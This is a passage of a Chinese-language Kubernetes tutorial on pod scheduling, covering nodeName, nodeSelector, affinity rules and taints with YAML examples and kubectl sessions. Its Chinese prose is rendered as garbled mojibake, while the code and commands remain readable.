ç»ä»¶éç¨ç¸åºçç®æ³è®¡ç®åºæ¥çï¼è¿ä¸ªè¿ç¨æ¯ä¸åäººå·¥æ§å¶çãä½æ¯å¨å®éä½¿ç¨ä¸­ï¼è¿å¹¶ä¸æ»¡è¶³çéæ±ï¼å ä¸ºå¾å¤æåµä¸ï¼æä»¬æ³æ§å¶æäº Pod å°è¾¾æäºèç¹ä¸ï¼é£ä¹åºè¯¥æä¹åå¢ï¼è¿å°±è¦æ±äºè§£ kubernetes å¯¹ Pod çè°åº¦è§åï¼kubernetes æä¾äºåå¤§ç±»è°åº¦æ¹å¼ï¼\n\n * èªå¨è°åº¦ï¼è¿è¡å¨åªä¸ªèç¹ä¸å®å¨ç± Scheduler ç»è¿ä¸ç³»åçç®æ³è®¡ç®å¾åº\n * å®åè°åº¦ï¼NodeNameãNodeSelector\n * äº²åæ§è°åº¦ï¼NodeAffinityãPodAffinityãPodAntiAffinity\n * æ±¡ç¹ï¼å®¹å¿ï¼è°åº¦ï¼TaintsãToleration\n\n\n# å®åè°åº¦\n\nå®åè°åº¦ï¼æçæ¯å©ç¨å¨ pod ä¸å£°æ nodeName æè nodeSelectorï¼ä»¥æ­¤å° Pod è°åº¦å°ææç node èç¹ä¸ãæ³¨æï¼è¿éçè°åº¦æ¯å¼ºå¶çï¼è¿å°±æå³çå³ä½¿è¦è°åº¦çç®æ  Node ä¸å­å¨ï¼ä¹ä¼åä¸é¢è¿è¡è°åº¦ï¼åªä¸è¿ pod è¿è¡å¤±è´¥èå·²ã\n\nNodeName\n\nNodeName ç¨äºå¼ºå¶çº¦æå° Pod è°åº¦å°æå®ç Name ç Node èç¹ä¸ãè¿ç§æ¹å¼ï¼å¶å®æ¯ç´æ¥è·³è¿ Scheduler çè°åº¦é»è¾ï¼ç´æ¥å° Pod è°åº¦å°æå®åç§°çèç¹ã\n\næ¥ä¸æ¥ï¼å®éªä¸ä¸ï¼åå»ºä¸ä¸ª pod-nodename.yaml æä»¶\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-nodename\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n  nodeName: node1 # æå®è°åº¦å°node1èç¹ä¸\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n#åå»ºPod\n[root@k8s-master01 ~]# kubectl create -f pod-nodename.yaml\npod/pod-nodename created\n\n#æ¥çPodè°åº¦å°NODEå±æ§ï¼ç¡®å®æ¯è°åº¦å°äºnode1èç¹ä¸\n[root@k8s-master01 ~]# kubectl get pods pod-nodename -n dev -o wide\nNAME           READY   STATUS    RESTARTS   AGE   IP            NODE      ......\npod-nodename   1/1     Running   0          56s   10.244.1.87   node1     ......   \n\n# æ¥ä¸æ¥ï¼å é¤podï¼ä¿®æ¹nodeNameçå¼ä¸ºnode3ï¼å¹¶æ²¡ænode3èç¹ï¼\n[root@k8s-master01 ~]# kubectl delete -f pod-nodename.yaml\npod "pod-nodename" deleted\n[root@k8s-master01 ~]# vim pod-nodename.yaml\n[root@k8s-master01 ~]# kubectl create -f pod-nodename.yaml\npod/pod-nodename created\n\n#åæ¬¡æ¥çï¼åç°å·²ç»åNode3èç¹è°åº¦ï¼ä½æ¯ç±äºä¸å­å¨node3èç¹ï¼æä»¥podæ æ³æ­£å¸¸è¿è¡\n[root@k8s-master01 ~]# kubectl get pods pod-nodename -n dev -o wide\nNAME           READY   STATUS    RESTARTS   AGE   IP       NODE    ......\npod-nodename   0/1     Pending   0          6s    <none>   node3   ......        \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\nNodeSelector\n\nNodeSelector ç¨äºå° pod è°åº¦å°æ·»å äºæå®æ ç­¾ç node èç¹ä¸ãå®æ¯éè¿ kubernetes ç label-selector æºå¶å®ç°çï¼ä¹å°±æ¯è¯´ï¼å¨ pod åå»ºä¹åï¼ä¼ç± scheduler ä½¿ç¨ MatchNodeSelector è°åº¦ç­ç¥è¿è¡ label å¹éï¼æ¾åºç®æ  nodeï¼ç¶åå° pod è°åº¦å°ç®æ èç¹ï¼è¯¥å¹éè§åæ¯å¼ºå¶çº¦æã\n\næ¥ä¸æ¥ï¼å®éªä¸ä¸ï¼\n\n1 é¦ååå«ä¸º node èç¹æ·»å æ ç­¾\n\n[root@k8s-master01 ~]# kubectl label nodes node1 nodeenv=pro\nnode/node2 labeled\n[root@k8s-master01 ~]# kubectl label nodes node2 nodeenv=test\nnode/node2 labeled\n\n\n1\n2\n3\n4\n\n\n2 åå»ºä¸ä¸ª pod-nodeselector.yaml æä»¶ï¼å¹¶ä½¿ç¨å®åå»º Pod\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-nodeselector\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n  nodeSelector: \n    nodeenv: pro # æå®è°åº¦å°å·ænodeenv=proæ ç­¾çèç¹ä¸\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n#åå»ºPod\n[root@k8s-master01 ~]# kubectl create -f pod-nodeselector.yaml\npod/pod-nodeselector created\n\n#æ¥çPodè°åº¦å°NODEå±æ§ï¼ç¡®å®æ¯è°åº¦å°äºnode1èç¹ä¸\n[root@k8s-master01 ~]# kubectl get pods pod-nodeselector -n dev -o wide\nNAME               READY   STATUS    RESTARTS   AGE     IP          NODE    ......\npod-nodeselector   1/1     Running   0          47s   10.244.1.87   node1   ......\n\n# æ¥ä¸æ¥ï¼å é¤podï¼ä¿®æ¹nodeSelectorçå¼ä¸ºnodeenv: xxxxï¼ä¸å­å¨æææ­¤æ ç­¾çèç¹ï¼\n[root@k8s-master01 ~]# kubectl delete -f pod-nodeselector.yaml\npod "pod-nodeselector" deleted\n[root@k8s-master01 ~]# vim pod-nodeselector.yaml\n[root@k8s-master01 ~]# kubectl create -f pod-nodeselector.yaml\npod/pod-nodeselector created\n\n#åæ¬¡æ¥çï¼åç°podæ æ³æ­£å¸¸è¿è¡,Nodeçå¼ä¸ºnone\n[root@k8s-master01 ~]# kubectl get pods -n dev -o wide\nNAME               READY   STATUS    RESTARTS   AGE     IP       NODE    \npod-nodeselector   0/1     Pending   0          2m20s   <none>   <none>\n\n# æ¥çè¯¦æ,åç°node selectorå¹éå¤±è´¥çæç¤º\n[root@k8s-master01 ~]# kubectl describe pods pod-nodeselector -n dev\n.......\nEvents:\n  Type     Reason            Age        From               Message\n  ----     ------            ----       ----               -------\n  Warning  FailedScheduling  <unknown>  default-scheduler  0/3 nodes are available: 3 node(s) didn\'t match node selector.\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n\n# äº²åæ§è°åº¦\n\nä»ç»äºä¸¤ç§å®åè°åº¦çæ¹å¼ï¼ä½¿ç¨èµ·æ¥éå¸¸æ¹ä¾¿ï¼ä½æ¯ä¹æä¸å®çé®é¢ï¼é£å°±æ¯å¦ææ²¡ææ»¡è¶³æ¡ä»¶ç Nodeï¼é£ä¹ Pod å°ä¸ä¼è¢«è¿è¡ï¼å³ä½¿å¨éç¾¤ä¸­è¿æå¯ç¨ Node åè¡¨ä¹ä¸è¡ï¼è¿å°±éå¶äºå®çä½¿ç¨åºæ¯ã\n\nåºäºä¸é¢çé®é¢ï¼kubernetes è¿æä¾äºä¸ç§äº²åæ§è°åº¦ï¼Affinityï¼ãå®å¨ NodeSelector çåºç¡ä¹ä¸çè¿è¡äºæ©å±ï¼å¯ä»¥éè¿éç½®çå½¢å¼ï¼å®ç°ä¼åéæ©æ»¡è¶³æ¡ä»¶ç Node è¿è¡è°åº¦ï¼å¦ææ²¡æï¼ä¹å¯ä»¥è°åº¦å°ä¸æ»¡è¶³æ¡ä»¶çèç¹ä¸ï¼ä½¿è°åº¦æ´å çµæ´»ã\n\nAffinity ä¸»è¦åä¸ºä¸ç±»ï¼\n\n * nodeAffinity (node äº²åæ§ï¼: ä»¥ node ä¸ºç®æ ï¼è§£å³ pod å¯ä»¥è°åº¦å°åªäº node çé®é¢\n * podAffinity (pod äº²åæ§) : ä»¥ pod ä¸ºç®æ ï¼è§£å³ pod å¯ä»¥ååªäºå·²å­å¨ç pod é¨ç½²å¨åä¸ä¸ªææåä¸­çé®é¢\n * podAntiAffinity (pod åäº²åæ§) : ä»¥ pod ä¸ºç®æ ï¼è§£å³ pod ä¸è½ååªäºå·²å­å¨ pod é¨ç½²å¨åä¸ä¸ªææåä¸­çé®é¢\n\n> å³äºäº²åæ§ (åäº²åæ§) ä½¿ç¨åºæ¯çè¯´æï¼\n> äº²åæ§ï¼å¦æä¸¤ä¸ªåºç¨é¢ç¹äº¤äºï¼é£å°±æå¿è¦å©ç¨äº²åæ§è®©ä¸¤ä¸ªåºç¨çå°½å¯è½çé è¿ï¼è¿æ ·å¯ä»¥åå°å ç½ç»éä¿¡èå¸¦æ¥çæ§è½æèã\n> åäº²åæ§ï¼å½åºç¨çéç¨å¤å¯æ¬é¨ç½²æ¶ï¼æå¿è¦éç¨åäº²åæ§è®©åä¸ªåºç¨å®ä¾ææ£åå¸å¨åä¸ª node ä¸ï¼è¿æ ·å¯ä»¥æé«æå¡çé«å¯ç¨æ§ã\n\nNodeAffinity\n\né¦åæ¥çä¸ä¸ NodeAffinity çå¯éç½®é¡¹ï¼\n\npod.spec.affinity.nodeAffinity\n  requiredDuringSchedulingIgnoredDuringExecution  Nodeèç¹å¿é¡»æ»¡è¶³æå®çææè§åæå¯ä»¥ï¼ç¸å½äºç¡¬éå¶\n    nodeSelectorTerms  èç¹éæ©åè¡¨\n      matchFields   æèç¹å­æ®µååºçèç¹éæ©å¨è¦æ±åè¡¨\n      matchExpressions   æèç¹æ ç­¾ååºçèç¹éæ©å¨è¦æ±åè¡¨(æ¨è)\n        key    é®\n        values å¼\n        operator å³ç³»ç¬¦ æ¯æExists, DoesNotExist, In, NotIn, Gt, Lt\n  preferredDuringSchedulingIgnoredDuringExecution ä¼åè°åº¦å°æ»¡è¶³æå®çè§åçNodeï¼ç¸å½äºè½¯éå¶ (å¾å)\n    preference   ä¸ä¸ªèç¹éæ©å¨é¡¹ï¼ä¸ç¸åºçæéç¸å³è\n      matchFields   æèç¹å­æ®µååºçèç¹éæ©å¨è¦æ±åè¡¨\n      matchExpressions   æèç¹æ ç­¾ååºçèç¹éæ©å¨è¦æ±åè¡¨(æ¨è)\n        key    é®\n        values å¼\n        operator å³ç³»ç¬¦ æ¯æIn, NotIn, Exists, DoesNotExist, Gt, Lt\n\tweight å¾åæéï¼å¨èå´1-100ã\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\nå³ç³»ç¬¦çä½¿ç¨è¯´æ:\n\n- matchExpressions:\n  - key: nodeenv              # å¹éå­å¨æ ç­¾çkeyä¸ºnodeenvçèç¹\n    operator: Exists\n  - key: nodeenv              # å¹éæ ç­¾çkeyä¸ºnodeenv,ä¸valueæ¯"xxx"æ"yyy"çèç¹\n    operator: In\n    values: ["xxx","yyy"]\n  - key: nodeenv              # å¹éæ ç­¾çkeyä¸ºnodeenv,ä¸valueå¤§äº"xxx"çèç¹\n    operator: Gt\n    values: "xxx"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\næ¥ä¸æ¥é¦åæ¼ç¤ºä¸ä¸ requiredDuringSchedulingIgnoredDuringExecution , åå»º pod-nodeaffinity-required.yaml\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-nodeaffinity-required\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n  affinity:  #äº²åæ§è®¾ç½®\n    nodeAffinity: #è®¾ç½®nodeäº²åæ§\n      requiredDuringSchedulingIgnoredDuringExecution: # ç¡¬éå¶\n        nodeSelectorTerms:\n        - matchExpressions: # å¹éenvçå¼å¨["xxx","yyy"]ä¸­çæ ç­¾\n          - key: nodeenv\n            operator: In\n            values: ["xxx","yyy"]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n# åå»ºpod\n[root@k8s-master01 ~]# kubectl create -f pod-nodeaffinity-required.yaml\npod/pod-nodeaffinity-required created\n\n# æ¥çpodç¶æ ï¼è¿è¡å¤±è´¥ï¼\n[root@k8s-master01 ~]# kubectl get pods pod-nodeaffinity-required -n dev -o wide\nNAME                        READY   STATUS    RESTARTS   AGE   IP       NODE    ...... \npod-nodeaffinity-required   0/1     Pending   0          16s   <none>   <none>  ......\n\n# æ¥çPodçè¯¦æ\n# åç°è°åº¦å¤±è´¥ï¼æç¤ºnodeéæ©å¤±è´¥\n[root@k8s-master01 ~]# kubectl describe pod pod-nodeaffinity-required -n dev\n......\n  Warning  FailedScheduling  <unknown>  default-scheduler  0/3 nodes are available: 3 node(s) didn\'t match node selector.\n  Warning  FailedScheduling  <unknown>  default-scheduler  0/3 nodes are available: 3 node(s) didn\'t match node selector.\n\n#æ¥ä¸æ¥ï¼åæ­¢pod\n[root@k8s-master01 ~]# kubectl delete -f pod-nodeaffinity-required.yaml\npod "pod-nodeaffinity-required" deleted\n\n# ä¿®æ¹æä»¶ï¼å°values: ["xxx","yyy"]------\x3e ["pro","yyy"]\n[root@k8s-master01 ~]# vim pod-nodeaffinity-required.yaml\n\n# åæ¬¡å¯å¨\n[root@k8s-master01 ~]# kubectl create -f pod-nodeaffinity-required.yaml\npod/pod-nodeaffinity-required created\n\n# æ­¤æ¶æ¥çï¼åç°è°åº¦æåï¼å·²ç»å°podè°åº¦å°äºnode1ä¸\n[root@k8s-master01 ~]# kubectl get pods pod-nodeaffinity-required -n dev -o wide\nNAME                        READY   STATUS    RESTARTS   AGE   IP            NODE  ...... \npod-nodeaffinity-required   1/1     Running   0          11s   10.244.1.89   node1 ......\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\næ¥ä¸æ¥åæ¼ç¤ºä¸ä¸ requiredDuringSchedulingIgnoredDuringExecution , åå»º pod-nodeaffinity-preferred.yaml\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-nodeaffinity-preferred\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n  affinity:  #äº²åæ§è®¾ç½®\n    nodeAffinity: #è®¾ç½®nodeäº²åæ§\n      preferredDuringSchedulingIgnoredDuringExecution: # è½¯éå¶\n      - weight: 1\n        preference:\n          matchExpressions: # å¹éenvçå¼å¨["xxx","yyy"]ä¸­çæ ç­¾(å½åç¯å¢æ²¡æ)\n          - key: nodeenv\n            operator: In\n            values: ["xxx","yyy"]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n# åå»ºpod\n[root@k8s-master01 ~]# kubectl create -f pod-nodeaffinity-preferred.yaml\npod/pod-nodeaffinity-preferred created\n\n# æ¥çpodç¶æ ï¼è¿è¡æåï¼\n[root@k8s-master01 ~]# kubectl get pod pod-nodeaffinity-preferred -n dev\nNAME                         READY   STATUS    RESTARTS   AGE\npod-nodeaffinity-preferred   1/1     Running   0          40s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n> NodeAffinity è§åè®¾ç½®çæ³¨æäºé¡¹ï¼\n> 1 å¦æåæ¶å®ä¹äº nodeSelector å nodeAffinityï¼é£ä¹å¿é¡»ä¸¤ä¸ªæ¡ä»¶é½å¾å°æ»¡è¶³ï¼Pod æè½è¿è¡å¨æå®ç Node ä¸\n> 2 å¦æ nodeAffinity æå®äºå¤ä¸ª nodeSelectorTermsï¼é£ä¹åªéè¦å¶ä¸­ä¸ä¸ªè½å¤å¹éæåå³å¯\n> 3 å¦æä¸ä¸ª nodeSelectorTerms ä¸­æå¤ä¸ª matchExpressions ï¼åä¸ä¸ªèç¹å¿é¡»æ»¡è¶³ææçæè½å¹éæå\n> 4 å¦æä¸ä¸ª pod æå¨ç Node å¨ Pod è¿è¡æé´å¶æ ç­¾åçäºæ¹åï¼ä¸åç¬¦åè¯¥ Pod çèç¹äº²åæ§éæ±ï¼åç³»ç»å°å¿½ç¥æ­¤åå\n\nPodAffinity\nPodAffinity ä¸»è¦å®ç°ä»¥è¿è¡ç Pod ä¸ºåç§ï¼å®ç°è®©æ°åå»ºç Pod è·åç§ pod å¨ä¸ä¸ªåºåçåè½ãé¦åæ¥çä¸ä¸ PodAffinity çå¯éç½®é¡¹ï¼\n\npod.spec.affinity.podAffinity\n  requiredDuringSchedulingIgnoredDuringExecution  ç¡¬éå¶\n    namespaces       æå®åç§podçnamespace\n    topologyKey      æå®è°åº¦ä½ç¨å\n    labelSelector    æ ç­¾éæ©å¨\n      matchExpressions  æèç¹æ ç­¾ååºçèç¹éæ©å¨è¦æ±åè¡¨(æ¨è)\n        key    é®\n        values å¼\n        operator å³ç³»ç¬¦ æ¯æIn, NotIn, Exists, DoesNotExist.\n      matchLabels    æå¤ä¸ªmatchExpressionsæ å°çåå®¹\n  preferredDuringSchedulingIgnoredDuringExecution è½¯éå¶\n    podAffinityTerm  éé¡¹\n      namespaces      \n      topologyKey\n      labelSelector\n        matchExpressions  \n          key    é®\n          values å¼\n          operator\n        matchLabels \n    weight å¾åæéï¼å¨èå´1-100\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n> topologyKey ç¨äºæå®è°åº¦æ¶ä½ç¨åï¼ä¾å¦:\n> å¦ææå®ä¸º kubernetes.io/hostnameï¼é£å°±æ¯ä»¥ Node èç¹ä¸ºåºåèå´\n> å¦ææå®ä¸º beta.kubernetes.io/os, åä»¥ Node èç¹çæä½ç³»ç»ç±»åæ¥åºå\n\næ¥ä¸æ¥ï¼æ¼ç¤ºä¸ requiredDuringSchedulingIgnoredDuringExecution\n1ï¼é¦ååå»ºä¸ä¸ªåç§ Podï¼pod-podaffinity-target.yamlï¼\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-podaffinity-target\n  namespace: dev\n  labels:\n    podenv: pro #è®¾ç½®æ ç­¾\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n  nodeName: node1 # å°ç®æ podåç¡®æå®å°node1ä¸\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n# å¯å¨ç®æ pod\n[root@k8s-master01 ~]# kubectl create -f pod-podaffinity-target.yaml\npod/pod-podaffinity-target created\n\n# æ¥çpodç¶åµ\n[root@k8s-master01 ~]# kubectl get pods  pod-podaffinity-target -n dev\nNAME                     READY   STATUS    RESTARTS   AGE\npod-podaffinity-target   1/1     Running   0          4s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n2ï¼åå»º pod-podaffinity-required.yamlï¼åå®¹å¦ä¸ï¼\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-podaffinity-required\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n  affinity:  #äº²åæ§è®¾ç½®\n    podAffinity: #è®¾ç½®podäº²åæ§\n      requiredDuringSchedulingIgnoredDuringExecution: # ç¡¬éå¶\n      - labelSelector:\n          matchExpressions: # å¹éenvçå¼å¨["xxx","yyy"]ä¸­çæ ç­¾\n          - key: podenv\n            operator: In\n            values: ["xxx","yyy"]\n        topologyKey: kubernetes.io/hostname\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\nä¸é¢éç½®è¡¨è¾¾çæææ¯ï¼æ° Pod å¿é¡»è¦ä¸æ¥ææ ç­¾ nodeenv=xxx æè nodeenv=yyy ç pod å¨åä¸ Node ä¸ï¼æ¾ç¶ç°å¨æ²¡æè¿æ · podï¼æ¥ä¸æ¥ï¼è¿è¡æµè¯ä¸ä¸ã\n\n# å¯å¨pod\n[root@k8s-master01 ~]# kubectl create -f pod-podaffinity-required.yaml\npod/pod-podaffinity-required created\n\n# æ¥çpodç¶æï¼åç°æªè¿è¡\n[root@k8s-master01 ~]# kubectl get pods pod-podaffinity-required -n dev\nNAME                       READY   STATUS    RESTARTS   AGE\npod-podaffinity-required   0/1     Pending   0          9s\n\n# æ¥çè¯¦ç»ä¿¡æ¯\n[root@k8s-master01 ~]# kubectl describe pods pod-podaffinity-required  -n dev\n......\nEvents:\n  Type     Reason            Age        From               Message\n  ----     ------            ----       ----               -------\n  Warning  FailedScheduling  <unknown>  default-scheduler  0/3 nodes are available: 2 node(s) didn\'t match pod affinity rules, 1 node(s) had taints that the pod didn\'t tolerate.\n\n# æ¥ä¸æ¥ä¿®æ¹  values: ["xxx","yyy"]-----\x3evalues:["pro","yyy"]\n# æææ¯ï¼æ°Podå¿é¡»è¦ä¸æ¥ææ ç­¾nodeenv=xxxæènodeenv=yyyçpodå¨åä¸Nodeä¸\n[root@k8s-master01 ~]# vim pod-podaffinity-required.yaml\n\n# ç¶åéæ°åå»ºpodï¼æ¥çææ\n[root@k8s-master01 ~]# kubectl delete -f  pod-podaffinity-required.yaml\npod "pod-podaffinity-required" deleted\n[root@k8s-master01 ~]# kubectl create -f pod-podaffinity-required.yaml\npod/pod-podaffinity-required created\n\n# åç°æ­¤æ¶Podè¿è¡æ­£å¸¸\n[root@k8s-master01 ~]# kubectl get pods pod-podaffinity-required -n dev\nNAME                       READY   STATUS    RESTARTS   AGE   LABELS\npod-podaffinity-required   1/1     Running   0          6s    <none>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\nå³äº PodAffinity ç preferredDuringSchedulingIgnoredDuringExecution ï¼è¿éä¸åæ¼ç¤ºã\nPodAntiAffinity\n\nPodAntiAffinity ä¸»è¦å®ç°ä»¥è¿è¡ç Pod ä¸ºåç§ï¼è®©æ°åå»ºç Pod è·åç§ pod ä¸å¨ä¸ä¸ªåºåä¸­çåè½ã\n\nå®çéç½®æ¹å¼åéé¡¹è· PodAffinty æ¯ä¸æ ·çï¼è¿éä¸ååè¯¦ç»è§£éï¼ç´æ¥åä¸ä¸ªæµè¯æ¡ä¾ã\n\n1ï¼ç»§ç»­ä½¿ç¨ä¸ä¸ªæ¡ä¾ä¸­ç®æ  pod\n\n[root@k8s-master01 ~]# kubectl get pods -n dev -o wide --show-labels\nNAME                     READY   STATUS    RESTARTS   AGE     IP            NODE    LABELS\npod-podaffinity-required 1/1     Running   0          3m29s   10.244.1.38   node1   <none>     \npod-podaffinity-target   1/1     Running   0          9m25s   10.244.1.37   node1   podenv=pro\n\n\n1\n2\n3\n4\n\n\n2ï¼åå»º pod-podantiaffinity-required.yamlï¼åå®¹å¦ä¸ï¼\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-podantiaffinity-required\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n  affinity:  #äº²åæ§è®¾ç½®\n    podAntiAffinity: #è®¾ç½®podäº²åæ§\n      requiredDuringSchedulingIgnoredDuringExecution: # ç¡¬éå¶\n      - labelSelector:\n          matchExpressions: # å¹épodenvçå¼å¨["pro"]ä¸­çæ ç­¾\n          - key: podenv\n            operator: In\n            values: ["pro"]\n        topologyKey: kubernetes.io/hostname\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\nä¸é¢éç½®è¡¨è¾¾çæææ¯ï¼æ° Pod å¿é¡»è¦ä¸æ¥ææ ç­¾ nodeenv=pro ç pod ä¸å¨åä¸ Node ä¸ï¼è¿è¡æµè¯ä¸ä¸ã\n\n# åå»ºpod\n[root@k8s-master01 ~]# kubectl create -f pod-podantiaffinity-required.yaml\npod/pod-podantiaffinity-required created\n\n# æ¥çpod\n# åç°è°åº¦å°äºnode2ä¸\n[root@k8s-master01 ~]# kubectl get pods pod-podantiaffinity-required -n dev -o wide\nNAME                           READY   STATUS    RESTARTS   AGE   IP            NODE   .. \npod-podantiaffinity-required   1/1     Running   0          30s   10.244.1.96   node2  ..\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# æ±¡ç¹åå®¹å¿\n\næ±¡ç¹ï¼Taintsï¼\n\nåé¢çè°åº¦æ¹å¼é½æ¯ç«å¨ Pod çè§åº¦ä¸ï¼éè¿å¨ Pod ä¸æ·»å å±æ§ï¼æ¥ç¡®å® Pod æ¯å¦è¦è°åº¦å°æå®ç Node ä¸ï¼å¶å®æä»¬ä¹å¯ä»¥ç«å¨ Node çè§åº¦ä¸ï¼éè¿å¨ Node ä¸æ·»å æ±¡ç¹å±æ§ï¼æ¥å³å®æ¯å¦åè®¸ Pod è°åº¦è¿æ¥ã\n\nNode è¢«è®¾ç½®ä¸æ±¡ç¹ä¹åå°±å Pod ä¹é´å­å¨äºä¸ç§ç¸æ¥çå³ç³»ï¼è¿èæç» Pod è°åº¦è¿æ¥ï¼çè³å¯ä»¥å°å·²ç»å­å¨ç Pod é©±éåºå»ã\n\næ±¡ç¹çæ ¼å¼ä¸ºï¼ key=value:effect , key å value æ¯æ±¡ç¹çæ ç­¾ï¼effect æè¿°æ±¡ç¹çä½ç¨ï¼æ¯æå¦ä¸ä¸ä¸ªéé¡¹ï¼\n\n * PreferNoScheduleï¼kubernetes å°å°½éé¿åæ Pod è°åº¦å°å·æè¯¥æ±¡ç¹ç Node ä¸ï¼é¤éæ²¡æå¶ä»èç¹å¯è°åº¦\n * NoScheduleï¼kubernetes å°ä¸ä¼æ Pod è°åº¦å°å·æè¯¥æ±¡ç¹ç Node ä¸ï¼ä½ä¸ä¼å½±åå½å Node ä¸å·²å­å¨ç Pod\n * NoExecuteï¼kubernetes å°ä¸ä¼æ Pod è°åº¦å°å·æè¯¥æ±¡ç¹ç Node ä¸ï¼åæ¶ä¹ä¼å° Node ä¸å·²å­å¨ç Pod é©±ç¦»\n\n\n\nä½¿ç¨ kubectl è®¾ç½®åå»é¤æ±¡ç¹çå½ä»¤ç¤ºä¾å¦ä¸ï¼\n\n# è®¾ç½®æ±¡ç¹\nkubectl taint nodes èç¹åç§° key=value:effect\n\n# å»é¤æ±¡ç¹\nkubectl taint nodes èç¹åç§° key:effect-\n\n# å»é¤æææ±¡ç¹\nkubectl taint nodes èç¹åç§° key-\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\næ¥ä¸æ¥ï¼æ¼ç¤ºä¸æ±¡ç¹çææï¼\n\n 1. åå¤èç¹ node1ï¼ä¸ºäºæ¼ç¤ºæææ´å ææ¾ï¼ææ¶åæ­¢ node2 èç¹ï¼\n 2. ä¸º node1 èç¹è®¾ç½®ä¸ä¸ªæ±¡ç¹: tag=heima:PreferNoSchedule ï¼ç¶ååå»º pod1 (pod1 å¯ä»¥)\n 3. ä¿®æ¹ä¸º node1 èç¹è®¾ç½®ä¸ä¸ªæ±¡ç¹: tag=heima:NoSchedule ï¼ç¶ååå»º pod2 (pod1 æ­£å¸¸ pod2 å¤±è´¥)\n 4. ä¿®æ¹ä¸º node1 èç¹è®¾ç½®ä¸ä¸ªæ±¡ç¹: tag=heima:NoExecute ï¼ç¶ååå»º pod3 (3 ä¸ª pod é½å¤±è´¥)\n\n# ä¸ºnode1è®¾ç½®æ±¡ç¹(PreferNoSchedule)\n[root@k8s-master01 ~]# kubectl taint nodes node1 tag=heima:PreferNoSchedule\n\n# åå»ºpod1\n[root@k8s-master01 ~]# kubectl run taint1 --image=nginx:1.17.1 -n dev\n[root@k8s-master01 ~]# kubectl get pods -n dev -o wide\nNAME                      READY   STATUS    RESTARTS   AGE     IP           NODE   \ntaint1-7665f7fd85-574h4   1/1     Running   0          2m24s   10.244.1.59   node1    \n\n# ä¸ºnode1è®¾ç½®æ±¡ç¹(åæ¶PreferNoScheduleï¼è®¾ç½®NoSchedule)\n[root@k8s-master01 ~]# kubectl taint nodes node1 tag:PreferNoSchedule-\n[root@k8s-master01 ~]# kubectl taint nodes node1 tag=heima:NoSchedule\n\n# åå»ºpod2\n[root@k8s-master01 ~]# kubectl run taint2 --image=nginx:1.17.1 -n dev\n[root@k8s-master01 ~]# kubectl get pods taint2 -n dev -o wide\nNAME                      READY   STATUS    RESTARTS   AGE     IP            NODE\ntaint1-7665f7fd85-574h4   1/1     Running   0          2m24s   10.244.1.59   node1 \ntaint2-544694789-6zmlf    0/1     Pending   0          21s     <none>        <none>   \n\n# ä¸ºnode1è®¾ç½®æ±¡ç¹(åæ¶NoScheduleï¼è®¾ç½®NoExecute)\n[root@k8s-master01 ~]# kubectl taint nodes node1 tag:NoSchedule-\n[root@k8s-master01 ~]# kubectl taint nodes node1 tag=heima:NoExecute\n\n# åå»ºpod3\n[root@k8s-master01 ~]# kubectl run taint3 --image=nginx:1.17.1 -n dev\n[root@k8s-master01 ~]# kubectl get pods -n dev -o wide\nNAME                      READY   STATUS    RESTARTS   AGE   IP       NODE     NOMINATED \ntaint1-7665f7fd85-htkmp   0/1     Pending   0          35s   <none>   <none>   <none>    \ntaint2-544694789-bn7wb    0/1     Pending   0          35s   <none>   <none>   <none>     \ntaint3-6d78dbd749-tktkq   0/1     Pending   0          6s    <none>   <none>   <none>     \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n> ä½¿ç¨ kubeadm 